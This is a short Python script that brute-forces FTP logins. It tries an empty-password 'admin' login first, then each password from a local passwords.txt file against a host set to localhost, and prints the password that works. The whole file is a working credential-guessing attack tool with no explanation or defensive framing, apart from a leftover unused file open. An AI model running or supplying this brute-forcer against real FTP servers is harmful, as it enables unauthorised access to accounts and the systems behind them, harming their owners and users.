import ftplib
import sys

def connect(host,user,password):
        try:
                ftp = ftplib.FTP(host)
                ftp.login(user=user, passwd = password)
                ftp.quit()
                return True
        except Exception as e:
                # print(e)
                return False

def main():
        Hostname = 'localhost' # Host to be given here
        if len(sys.argv) == 2:
                username = sys.argv[1]
        else:
                username = 'admin' # FTP username here
        passwordspath = 'passwords.txt' # Dictionary file for bruteforcing
        
        print('[+] Using anonymous credentials for ' + Hostname)
        if connect(Hostname,'admin','') :
        # if connect(Hostname,'anonymous','test@solo.nepal') :
                print('[+] FTP Anonymous logon succeeded on host : ' + Hostname)
        else:
                print('[-] FTP Anonymous logon failed on host : ' + Hostname)
             
                passwordsFile = open(passwordspath)
        with open(passwordspath,'r') as f:
                for line in f:
                        password = str(line.replace('\n',''))
                        print("Testing: " + password)
                        if connect(Hostname,username,password):
                                # Password Found
                                print("[+] FTP Logon succeeded on host : " + Hostname + "  using username :  " + username + " and password :  " + password)
                                exit(0)
                        else:
                                # Password not found
                                print("[-] FTP Logon failed on host : " + Hostname + " using username :  " + username + " and password :  " + password)
if __name__ ==  "__main__":
        main()
